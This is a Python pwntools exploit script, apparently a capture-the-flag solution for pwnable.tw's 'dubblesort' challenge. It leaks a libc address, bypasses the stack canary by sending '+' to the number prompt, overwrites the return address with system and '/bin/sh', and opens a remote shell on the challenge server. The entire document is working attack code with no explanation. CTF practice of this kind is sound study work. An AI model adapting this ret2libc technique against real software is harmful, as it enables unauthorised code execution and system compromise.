from pwn import *

HOST = "chall.pwnable.tw"
PORT = 10101

elf = ELF("./dubblesort_patched")
libc = ELF("libc_32.so.6")

DEBUG = False

if (DEBUG == True):
    p = elf.process()
    raw_input("DEBUG")
    #gdb.attach(io)
else:
    p = remote("chall.pwnable.tw", 10101)

p.sendline(b"A"*28)
p.recvuntil("A"*28)
leak1  = u32(p.recv(4)) - 0xa
print(hex(leak1))
libc.address = leak1 - 0x1B0000
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))
log.info("System: " + hex(system))
log.info("bin_sh: " + hex(bin_sh))

p.sendlineafter("How many numbers do you what to sort :", "35")

for i in range (24):
	p.sendlineafter("number : ","1")
p.sendlineafter("number : ", "+")
for i in range(8):
	p.sendlineafter("number : ", str(system))
for i in range(2):
	p.sendlineafter("number : ", str(bin_sh))

p.interactive()


